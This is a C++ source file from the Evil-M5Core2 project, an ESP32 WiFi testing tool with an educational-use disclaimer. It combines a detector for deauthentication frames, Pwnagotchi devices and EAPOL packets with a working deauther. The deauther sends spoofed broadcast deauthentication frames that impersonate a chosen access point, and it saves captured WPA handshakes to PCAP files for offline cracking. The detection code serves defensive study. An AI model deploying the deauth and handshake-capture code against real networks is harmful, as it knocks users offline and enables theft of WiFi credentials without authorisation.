/*
    Evil-M5Core2 - WiFi Network Testing and Exploration Tool

    Copyright (c) 2024 7h30th3r0n3
    Copyright (c) 2024 lvlhead

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

    Disclaimer:
    This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only.
    Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
    assumes no liability and is not responsible for any misuse or damage caused by this tool.
    Users are required to comply with all applicable laws and regulations in their jurisdiction
    regarding network testing and ethical hacking.
*/

extern "C" {
    #include "esp_wifi.h"
    #include "esp_wifi_types.h"
    #include "esp_system.h"
}

#include "evil-detector.h"

unsigned int packetCount = 0;  // Number of packets received
int nombreDeHandshakes = 0; // Nombre de handshakes/PMKID capturés
std::set<String> registeredBeacons;

// UI Variables
bool detectedDeauth = false;
int nombreDeDeauth = 0;
String deauthRssi, deauthChannel, deauthAddr1, deauthAddr2 = "";
bool detectedPwnagotchi = false;
String pwnagotchiName = "";
String pwnagotchiPwnd = "";
bool detectedEAPOL = false;
int nombreDeEAPOL = 0;

// Deauther Attack Variables
uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};   // MAC source
uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // MAC client - brodcast - should not work on some device that need to be mac spoofed
uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};   // MAC access point
const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, // type, subtype
    0x3a, 0x01, // duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // MAC client
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC source (ESP32)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC access point
    0xf0, 0xff, // fragment & squence number
    0x02, 0x00 // reason code
};

typedef struct {
  unsigned protocol:2;
  unsigned type:2;
  unsigned subtype:4;
  unsigned to_ds:1;
  unsigned from_ds:1;
  unsigned more_frag:1;
  unsigned retry:1;
  unsigned pwr_mgmt:1;
  unsigned more_data:1;
  unsigned wep:1;
  unsigned strict:1;
} wifi_header_frame_control_t;

// https://carvesystems.com/news/writing-a-simple-esp8266-based-sniffer/
typedef struct {
  wifi_header_frame_control_t frame_ctrl;
  unsigned duration_id:16;
  uint8_t addr1[6]; /* receiver MAC address */
  uint8_t addr2[6]; /* sender MAC address */
  uint8_t addr3[6]; /* BSSID filtering address */
  unsigned sequence_ctrl:16;
  uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;

typedef struct
{
  unsigned interval:16;
  unsigned capability:16;
  unsigned tag_number:8;
  unsigned tag_length:8;
  char ssid[0];
  uint8_t rates[1];
} wifi_beacon_hdr;

// EAPOL
typedef struct {
  wifi_header_frame_control_t frame_ctrl;
  uint8_t addr1[6]; /* receiver MAC address */
  uint8_t addr2[6]; /* sender MAC address */
  uint8_t addr3[6]; /* BSSID filtering address */
  unsigned sequence_ctrl:16;
  uint8_t addr4[6]; /* optional */
} wifi_eapol_mac_hdr_t;

typedef struct {
  wifi_eapol_mac_hdr_t hdr;
  uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_eapol_packet_t;

typedef struct
{
  unsigned eth_type:2;  // Indicates the protocol type. Fixed value 0x888E.
  unsigned version:1;   // 0x01: 802.1X-2001, 0x02: 802.1X-2004, 0x03: 802.1X-2010
  unsigned type:1;      // Indicates the type of an EAPoL data packet
  unsigned length:2;
} wifi_eapol_hdr;

typedef struct {
  uint8_t mac[6];
} __attribute__((packed)) mac_addr;


typedef enum
{
    ASSOCIATION_REQ,
    ASSOCIATION_RES,
    REASSOCIATION_REQ,
    REASSOCIATION_RES,
    PROBE_REQ,
    PROBE_RES,
    NU1,  /* ......................*/
    NU2,  /* 0110, 0111 not used */
    BEACON,
    ATIM,
    DISASSOCIATION,
    AUTHENTICATION,
    DEAUTHENTICATION,
    ACTION,
    ACTION_NACK,
} wifi_mgmt_subtypes_t;

// Définition de l'en-tête de fichier PCAP global
typedef struct pcap_hdr_s {
    uint32_t magic_number;   /* numéro magique */
    uint16_t version_major;  /* numéro de version majeur */
    uint16_t version_minor;  /* numéro de version mineur */
    int32_t  thiszone;       /* correction de l'heure locale */
    uint32_t sigfigs;        /* précision des timestamps */
    uint32_t snaplen;        /* taille max des paquets capturés, en octets */
    uint32_t network;        /* type de données de paquets */
} pcap_hdr_t;

// Définition de l'en-tête d'un paquet PCAP
typedef struct pcaprec_hdr_s {
    uint32_t ts_sec;         /* timestamp secondes */
    uint32_t ts_usec;        /* timestamp microsecondes */
    uint32_t incl_len;       /* nombre d'octets du paquet enregistrés dans le fichier */
    uint32_t orig_len;       /* longueur réelle du paquet */
} pcaprec_hdr_t;

const char * wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
{
  switch(type) {
  case WIFI_PKT_MGMT: return "MGMT";
  case WIFI_PKT_DATA: return "DATA";
  default:
  case WIFI_PKT_MISC: return "MISC";
  }
}

EvilDetector::EvilDetector() {
    updateScreen = true;
    currentChannelDeauth = 1;
    autoChannelHop = true; // Starts in auto mode
    channelType = autoChannelHop ? "Auto" : "Static";
    maxChannelScanning = 13;
    isAppRunning = false;
    deauthCount = 0;
    cfg_sniffEAPOL = false;
}

void EvilDetector::emptyDetectorCallback(CallbackMenuItem& menuItem) {
    M5.Display.clear();
    menuItem.getMenu()->displaySoftKey(BtnASlot, "Mode");
    menuItem.getMenu()->displaySoftKey(BtnBSlot, "Exit");
    menuItem.getMenu()->displaySoftKey(BtnCSlot, "Next");
}

void EvilDetector::emptyDeautherCallback(CallbackMenuItem& menuItem) {
    M5.Display.clear();
    menuItem.getMenu()->displaySoftKey(BtnBSlot, "Stop");
}

void EvilDetector::showDetectorApp() {
    // Set up application for first run
    if (!isAppRunning) {
        //bluetoothEnabled = false;
        esp_wifi_set_promiscuous(false);
        esp_wifi_stop();
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_deinit();
        delay(300); // Small delay
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_wifi_init(&cfg);
        esp_wifi_start();
        WiFi.mode(WIFI_STA);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(snifferCallback);
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);

        if (!SD.exists("/handshakes")) {
            if (SD.mkdir("/handshakes")) {
                Serial.println("/handshakes folder created");
            } else {
                Serial.println("Fail to create /handshakes folder");
                return;
            }
        }
        toggleAppRunning();
    }

    // Run the app
    if (ui.waitToRefresh()) {
        if (autoChannelHop) {
            incrementChannel(1);
        }

        // Draw the screen
        channelType = autoChannelHop ? "Auto" : "Static";
        ui.writeMessageXY_small("Channel: " + String(currentChannelDeauth), 5, 16, false);
        ui.writeMessageXY_small("Mode: " + channelType, 5, 37, false);

        if (detectedPwnagotchi) {
            ui.writeMessageXY_small("Pwnagotchi: " + pwnagotchiName, 5, 170, false);
            ui.writeMessageXY_small("Pwnd: " + pwnagotchiPwnd, 5, 188, false);
        }
        if (detectedDeauth) {
            ui.writeMessageXY_small("Deauth Detected!", 5, 64, false);
            ui.writeMessageXY_small("CH: " + deauthChannel + " RSSI: " + deauthRssi, 5, 85, false);
            ui.writeMessageXY_small("Send: " + deauthAddr1, 5, 106, false);
            ui.writeMessageXY_small("Receive: " + deauthAddr2, 5, 127, false);
        }
        ui.writeMessageXY_small("PPS: " + String(packetCount), 180, 15, false);
        ui.writeMessageXY_small("H: " + String(nombreDeHandshakes), 228, 35, false);
        ui.writeMessageXY_small("EAPOL: " + String(nombreDeEAPOL), 182, 55, false);
        ui.writeMessageXY_small("DEAUTH: " + String(nombreDeDeauth), 168, 75, false);
        packetCount = 0;
    }
}

void EvilDetector::showDeautherApp() {
    // Set up application for first run
    if (!isAppRunning) {
        ssid = currentClonedSSID;
/*        if (!ui.confirmPopup("Deauth attack on:\n      " + ssid, false)) {
            // Return to the main menu
            closeDeautherApp();
        }*/
        Serial.println("Deauth attack started");
        Serial.println("-------------------");
        Serial.println("Starting Deauth Attack");
        Serial.println("-------------------");

        esp_wifi_set_promiscuous(false);
        esp_wifi_stop();
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_deinit();
        delay(300); // Petite pause pour s'assurer que tout est terminé
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_wifi_init(&cfg);
        esp_wifi_set_mode(WIFI_MODE_STA); // Set station mode
        esp_wifi_start(); // start Wi-Fi

//        if (ui.confirmPopup("   Do you want to\n       sniff EAPOL ?", false)) {
        if (cfg_sniffEAPOL) {
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
        }

        // Récupérer les informations de l'AP sélectionné
        uint8_t* bssid = WiFi.BSSID(networkIndex);
        channel = WiFi.channel(networkIndex);
        macAddress = convMACToStr(bssid);

        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        currentChannelDeauth = channel;
        updateMacAddresses(bssid);

        Serial.print("SSID: "); Serial.println(ssid);
        Serial.print("MAC Address: "); Serial.println(macAddress);
        Serial.print("Channel: "); Serial.println(channel);

        toggleAppRunning();
    }

    // Run the app
    if (ui.waitToRefresh()) {
        sendDeauthPacket();
        deauthCount++;

        // Draw the screen
        ui.writeMessageXY_small("H: " + String(nombreDeHandshakes), 228, 35, false);
        ui.writeMessageXY_small("EAPOL: " + String(nombreDeEAPOL), 182, 55, false);
        ui.writeMessageXY_small("SSID: " + ssid, 10, 40, false);
        ui.writeMessageXY_small("MAC: " + macAddress, 10, 60, false);
        ui.writeMessageXY_small("Channel: " + String(channel), 10, 80, false);
        ui.writeMessageXY_small("Deauth sent: " + String(deauthCount), 10, 110, false);
    }
}

void EvilDetector::closeDetectorApp() {
    esp_wifi_set_promiscuous(false);
    toggleAppRunning();
    //toggleAutoChannelHop();
    ui.waitAndReturnToMenu("Stop detection...");
}

void EvilDetector::closeDeautherApp() {
    toggleAppRunning();
    Serial.println("-------------------");
    Serial.println("Stopping Deauth Attack");
    Serial.println("-------------------");

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    /*esp_wifi_stop();
    esp_wifi_deinit();*/

    ui.waitAndReturnToMenu("Stopping Deauth Attack");
}

void EvilDetector::toggleAppRunning() {
    isAppRunning = !isAppRunning;
}

void EvilDetector::toggleCfgSniffEAPOL() {
    cfg_sniffEAPOL = !cfg_sniffEAPOL;
}

bool EvilDetector::getCfgSniffEAPOL() {
    return cfg_sniffEAPOL;
}

void EvilDetector::toggleAutoChannelHop() {
    autoChannelHop = !autoChannelHop;
}

bool EvilDetector::getAutoChannelHop() {
    return autoChannelHop;
}

void EvilDetector::incrementChannel(int count) {
    currentChannelDeauth += count;
    if (currentChannelDeauth < 1) currentChannelDeauth = maxChannelScanning;
    if (currentChannelDeauth > maxChannelScanning) currentChannelDeauth = 1;
    esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
    channelType = autoChannelHop ? "Auto" : "Static";
    sendMessage(channelType + " Channel : " + String(currentChannelDeauth));
}

bool isAnEAPOLPacket(const wifi_promiscuous_pkt_t* packet) {
    const uint8_t *payload = packet->payload;
    int len = packet->rx_ctrl.sig_len;
    int qosOffset = 0;

    // length check to ensure packet is large enough for EAPOL (minimum length)
    if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
        return false;
    }

    // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
    // check if the frame control field's subtype indicates a QoS data subtype (0x08)
    if ((payload[0] & 0x0F) == 0x08) {
        qosOffset = 2;
    }

    // check for LLC/SNAP header indicating EAPOL payload
    // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
    if (payload[24+qosOffset] == 0xAA && payload[25+qosOffset] == 0xAA && payload[26+qosOffset] == 0x03 &&
        payload[27+qosOffset] == 0x00 && payload[28+qosOffset] == 0x00 && payload[29+qosOffset] == 0x00 &&
        payload[30+qosOffset] == 0x88 && payload[31+qosOffset] == 0x8E) {
        return true;
    }

    return false;
}

void writePCAPHeader(File &file) {
    pcap_hdr_t pcap_header;
    pcap_header.magic_number = 0xa1b2c3d4;
    pcap_header.version_major = 2;
    pcap_header.version_minor = 4;
    pcap_header.thiszone = 0;
    pcap_header.sigfigs = 0;
    pcap_header.snaplen = 65535;
    pcap_header.network = 105; // LINKTYPE_IEEE802_11

    file.write((const byte*)&pcap_header, sizeof(pcap_hdr_t));
    nombreDeHandshakes++;
}

void saveToPCAPFile(const wifi_promiscuous_pkt_t* packet, bool haveBeacon) {
    // Construire le nom du fichier en utilisant les adresses MAC de l'AP et du client
    // Construct the file name using the AP and client MAC address
    const uint8_t *addr1 = packet->payload + 4;  // Recipient address (Address 1)
    const uint8_t *addr2 = packet->payload + 10; // Sender address (Address 2)
    const uint8_t *bssid = packet->payload + 16; // BSSID address   (Address 3)
    const uint8_t *apAddr;

    if (memcmp(addr1, bssid, 6) == 0) {
        apAddr = addr1;
    } else {
        apAddr = addr2;
    }

    char nomFichier[50];
    sprintf(nomFichier, "/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
    apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

    // Check if the file already exists
    bool fichierExiste = SD.exists(nomFichier);

    // If the probe is true and the file does not exist, skip saving
    if (haveBeacon && !fichierExiste) {
        return;
    }

    // Open the file in append mode if exists, otherwise open in write mode
    File fichierPcap = SD.open(nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE);
    if (!fichierPcap) {
        Serial.println("Failed to open PCAP file");
        return;
    }

    if (!haveBeacon && !fichierExiste) {
        Serial.println("Writing the global header to the PCAP file");
        writePCAPHeader(fichierPcap);
    }

    if (haveBeacon && fichierExiste) {
        String bssidStr = String((char*)apAddr, 6);
        if (registeredBeacons.find(bssidStr) != registeredBeacons.end()) {
            return; // Beacon already registered for this BSSID
        }
        registeredBeacons.insert(bssidStr); // Add the BSSID
    }

    // Write the packet header and the packet itself to a file
    pcaprec_hdr_t pcap_packet_header;
    pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
    pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
    pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
    pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;
    fichierPcap.write((const byte*)&pcap_packet_header, sizeof(pcaprec_hdr_t));
    fichierPcap.write(packet->payload, packet->rx_ctrl.sig_len);
    fichierPcap.close();
}

String convMACToStr(const uint8_t* addr) {
    char macBuffer[18];
    sprintf(macBuffer, "%02X:%02X:%02X:%02X:%02X:%02X",
            addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
    return String(macBuffer);
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Increment packet count for every received packet
    packetCount++;

    // Quickly exit if we do not have a DATA or MGMT packet
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    // Data structs for easier packet data collection
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
    const wifi_header_frame_control_t *fctl = (wifi_header_frame_control_t *)&hdr->frame_ctrl;
    int len = pkt->rx_ctrl.sig_len;

    const wifi_eapol_packet_t *eapolPkt = (wifi_eapol_packet_t *)pkt->payload;
    const wifi_eapol_mac_hdr_t *eapolHdr = &eapolPkt->hdr;

    // Handle EAPOL packet detection
    if (isAnEAPOLPacket(pkt)) {
        Serial.println("EAPOL Detected !!!!");
        // Display on the serial port
        Serial.println("Address MAC destination: " + convMACToStr(eapolHdr->addr1));
        Serial.println("Address MAC expedition: " + convMACToStr(eapolHdr->addr2));

        saveToPCAPFile(pkt, false);
        nombreDeEAPOL++;
    }

    // Handle MGMT packets, Pwnagotchi and Deauth Detection
    if (fctl->type == WIFI_PKT_MGMT) {
        if (fctl->subtype == BEACON) {  // Handle Management Beacons
            // Convert MAC address to string for comparison
            if (convMACToStr(eapolHdr->addr2) == "DE:AD:BE:EF:DE:AD") {
                sendMessage("-------------------");
                sendMessage("Pwnagotchi Detected !!!");
                sendMessage("CH: " + String(pkt->rx_ctrl.channel));
                sendMessage("RSSI: " + String(pkt->rx_ctrl.rssi));
                sendMessage("MAC: " + convMACToStr(eapolHdr->addr2));
                sendMessage("-------------------");

                String essid = ""; // Prepare string for ESSID
                for (int i = 0; i < len - 37; i++) {
                    if (isAscii(pkt->payload[i + 38])) {
                        essid.concat((char)pkt->payload[i + 38]);
                    }
                }

                int jsonStart = essid.indexOf('{');
                if (jsonStart != -1) {
                    String cleanJson = essid.substring(jsonStart); // Clean the JSON

                    DynamicJsonDocument json(4096); // Increase the size for parsing
                    DeserializationError error = deserializeJson(json, cleanJson);

                    if (!error) {
                        sendMessage("Successfully parsed json");
                        pwnagotchiName = json["name"].as<String>(); // Extract the name
                        pwnagotchiPwnd = json["pwnd_tot"].as<String>(); // Extract total number of `pwnd` networks
                        sendMessage("Name: " + pwnagotchiName); // Print the name
                        sendMessage("pwnd: " + pwnagotchiPwnd); // Print total number of `pwnd` networks
                        detectedPwnagotchi = true;
                    } else {
                        sendMessage("Could not parse Pwnagotchi json");
                    }
                } else {
                    sendMessage("JSON start not found in ESSID");
                }
            } else {
                pkt->rx_ctrl.sig_len -= 4;  // Reduce signal length by 4 bytes
                saveToPCAPFile(pkt, true);  // Save the packet
            }
        }

        if (fctl->subtype == DEAUTHENTICATION) {    // Handle Management Deauthentication
            Serial.printf("Deauth Packet detected\n");

            deauthChannel = pkt->rx_ctrl.channel;
            deauthRssi = pkt->rx_ctrl.rssi;
            deauthAddr1 = convMACToStr(eapolHdr->addr1);
            deauthAddr2 = convMACToStr(eapolHdr->addr2);

            // Display on the serial port
            Serial.println("-------------------");
            Serial.println("Deauth Packet detected !!! :");
            Serial.println("CH: " + deauthChannel);
            Serial.println("RSSI: " + deauthRssi);
            Serial.println("Sender: " + deauthAddr1);
            Serial.println("Receiver: " + deauthAddr2);
            Serial.println();

            // Display on screen
            detectedDeauth = true;
            nombreDeDeauth++;
        }
    }
}

// Deauther Attack
void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    // Data structs for easier packet data collection
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
    const wifi_header_frame_control_t *fctl = (wifi_header_frame_control_t *)&hdr->frame_ctrl;
    int len = pkt->rx_ctrl.sig_len;

    const wifi_eapol_packet_t *eapolPkt = (wifi_eapol_packet_t *)pkt->payload;
    const wifi_eapol_mac_hdr_t *eapolHdr = &eapolPkt->hdr;

    if (isAnEAPOLPacket(pkt)) {
        Serial.println("EAPOL Detected !!!!");
        Serial.println("Address MAC destination: " + convMACToStr(eapolHdr->addr1));
        Serial.println("Address MAC expedition: " + convMACToStr(eapolHdr->addr2));

        saveToPCAPFile(pkt, false);
        nombreDeEAPOL++;
    }

    if (fctl->type == WIFI_PKT_MGMT && fctl->subtype == BEACON) {
/*        const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

        // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
        senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);
*/
        pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
        saveToPCAPFile(pkt, true);  // Enregistrer le paquet
    }
}

void sendDeauthPacket() {
  // Création d'une copie modifiable du paquet de déauthentification
  uint8_t deauth_frame[sizeof(deauth_frame_default)];
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

  // Modifier les adresses MAC dans le paquet de déauthentification copié
  for (int i = 0; i < 6; i++) {
    deauth_frame[4 + i] = receiver_mac[i];  // Adresse MAC du récepteur
    deauth_frame[10 + i] = source_mac[i];  // Adresse MAC source
    deauth_frame[16 + i] = ap_mac[i];      // Adresse MAC de l'access point
  }

  // Envoyer le paquet modifié
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

  // Affichage du contenu du paquet pour le débogage
    Serial.println("Deauthentication Frame:");
    for (int i = 0; i < sizeof(deauth_frame); i++) {
    Serial.print(deauth_frame[i], HEX);
    Serial.print(" ");
    }
    Serial.println();
}

void updateMacAddresses(uint8_t* bssid) {
  memcpy(source_mac, bssid, 6);
  memcpy(ap_mac, bssid, 6);
}
